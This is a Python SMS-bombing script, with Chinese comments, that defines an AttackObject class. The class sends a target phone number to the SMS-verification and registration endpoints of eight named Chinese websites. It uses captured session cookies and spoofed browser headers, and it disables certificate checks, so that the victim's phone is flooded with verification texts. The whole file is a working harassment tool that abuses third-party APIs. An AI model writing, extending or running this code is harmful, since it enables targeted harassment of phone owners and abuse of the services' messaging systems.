import requests

# 关闭未受信的CA证书提示
requests.packages.urllib3.disable_warnings()

TARGET_PHONE = ''
TIMEOUT = 10
HEADERS = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
	'Accept-Encoding': 'gzip, deflate',
	'Connection': 'close',
	'Referer': ''
}


class InterfaceList(object):

	def __init__(self, referer, send_msg_url, payload, cookies, request_type='post', payload_type='data', captcha=False, captcha_methods=None):
		self.referer = referer
		self.send_msg_url = send_msg_url
		self.payload = payload
		self.cookies = cookies
		self.request_type = request_type
		self.payload_type = payload_type
		self.captcha = captcha
		self.captcha_methods = captcha_methods


class AttackObject(object):
	def __init__(self, phone):
		self.phone = phone

	# init msg list
	def init_data(self):
		TARGET_PHONE = self.phone
		interface_list = [
			InterfaceList('https://www.fengwo.com/account/register', 'https://www.fengwo.com/account/sendSmsCode', {
				'type': 'register',
				'mobile': TARGET_PHONE,
				'nationCode': '0086',
				'captcha': '',
			}, ''),
			InterfaceList('http://www.founderfx.cn/fxsso/login?service=http://www.founderfx.cn/ucenter/user.jhtmucenter/user.jhtml&_scope=1', 'http://47.92.148.0:8092/spc-member-web/spc/eb/member/AliDaYunController.do', {
				'jsonpCallback': 'jQuery1102018802688511155818_1562311698762',
				'mobileno': TARGET_PHONE,
				'callback': 'callbackDeal',
				'_': '1562311698764',
			}, 'JSESSIONID=0BB24A3BB2B574276AC98417ED90020A', 'get', 'params'),
			InterfaceList('http://www.dianwenjuan.com/regphone.html', 'http://www.dianwenjuan.com/Ashx/HService.ashx?action=code', {
				'phone': TARGET_PHONE,
			}, 'security_session_verify=4978cf37b0ccb791888655ef96076afe'),
			InterfaceList('https://mubu.com/reg', 'https://mubu.com/api/reg/send_sms_code', {
				'sendId': 'a08666bc-aba7-458d-aa41-9e5c4a318265',
				'phone': TARGET_PHONE,
			}, 'data_unique_id=dd1f1289-e7c4-4a63-8025-6ee5ed304174; SESSION=MzQzMDQwM2YtMjY0ZS00MjdhLTg2NmUtODdiZDg1NjkwYmJi; reg_entrance=https%3A%2F%2Fmubu.com%2Freg; reg_prepareId=16bc1956993-16bc1956759-458d-aa41-9e5c4a318265; _ga=GA1.2.371963719.1562320923; _gid=GA1.2.593854366.1562320923; reg_focusId=a08666bc-aba7-458d-aa41-16bc1957d54'),
			InterfaceList('http://www.ilab-x.com/register', 'http://www.ilab-x.com/sms/api/send', {
				'phone': TARGET_PHONE,
				'action': '0',
				'id': '-1',
			}, 'acw_tc=65c86a0c15623217628107946ebd142af95e72e7a82a1b60d8685f02b1fff7; Hm_lvt_d620024bcb53994af2db47e49e9977fe=1562321772; Hm_lpvt_d620024bcb53994af2db47e49e9977fe=1562321772', 'post', 'json'),
			InterfaceList('https://ones.ai/sign_up.html?s=0', 'https://ones.ai/api/project/auth/verify_sms', {
				'phone': '+86'+TARGET_PHONE,
				'action': '0',
				'id': '-1',
			}, 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216bc1ba5d7461e-08f6b34dbf51a7-4a5568-1296000-16bc1ba5d752a7%22%2C%22%24device_id%22%3A%2216bc1ba5d7461e-08f6b34dbf51a7-4a5568-1296000-16bc1ba5d752a7%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22%22%2C%22%24latest_referrer_host%22%3A%22%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%7D%7D; sajssdk_2015_cross_new_user=1; Hm_lvt_74b5f61e31435aedafb0ca993b7ffa9e=1562323345; Hm_lpvt_74b5f61e31435aedafb0ca993b7ffa9e=1562323345; _ga=GA1.2.575633601.1562323346; _gid=GA1.2.110147628.1562323346; _gat_gtag_UA_134717999_1=1', 'post', 'json'),
			InterfaceList('https://www.woodo.cn/login/?type=wechat', 'https://www.woodo.cn/api/common/mobile_code_ext/?v=1562323840946', {
				'mobile': TARGET_PHONE,
				'mid': 'SMS_150738151',
			}, 'Hm_lvt_2ec06305a7e8167e7a692c1b0bc69c5d=1562323841; Hm_lpvt_2ec06305a7e8167e7a692c1b0bc69c5d=1562323841; SESSION=39bf9ba7-b3a7-45c6-a785-2a8f34927f1a'),
			InterfaceList('https://www.xmind.cn/signup/', 'https://www.xmind.cn/_res/phone/_xmind_xqSgwhsknF/verify', {
				'new_phone': TARGET_PHONE,
			}, '_ga=GA1.2.2110148767.1562296192; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _jsuid=2678715284; Hm_lvt_087caa731c66e1c62df8b40cbbd38375=1562296191,1563358741; _gid=GA1.2.1914222110.1563358741; _first_pageview=1; _pk_ref.9.fcfa=%5B%22%22%2C%22%22%2C1563358742%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.9.fcfa=*; heatmaps_g2g_101051974=yes; Hm_lpvt_087caa731c66e1c62df8b40cbbd38375=1563358783; _pk_id.9.fcfa=68ee22d5e7d2f767.1562296192.2.1563358783.1563358742.', 'get', 'params'),
		]
		for send_msg_data in interface_list:
			send_msg(send_msg_data)

def send_msg(interface_data):

	# 有验证参数，走独立方法发送短信
	if interface_data.captcha:
		interface_data.captcha_methods(interface_data)

	# 无验证参数，走通用方法发送短信
	else:
		HEADERS['Referer'] = interface_data.referer
		HEADERS['Cookie'] = interface_data.cookies
		# 判断请求方式和payload类型
		if interface_data.request_type is 'post' and interface_data.payload_type is 'data':
			r = requests.post(interface_data.send_msg_url, headers=HEADERS, data=interface_data.payload, timeout=TIMEOUT, verify=False)
			print(r.status_code)
			print(r.text)
		elif interface_data.request_type is 'get' and interface_data.payload_type is 'params':
			r = requests.get(interface_data.send_msg_url, headers=HEADERS, params=interface_data.payload, timeout=TIMEOUT, verify=False)
			print(r.status_code)
			print(r.text)
		else:
			r = requests.post(interface_data.send_msg_url, headers=HEADERS, json=interface_data.payload, timeout=TIMEOUT, verify=False)
			print(r.status_code)
			print(r.text)
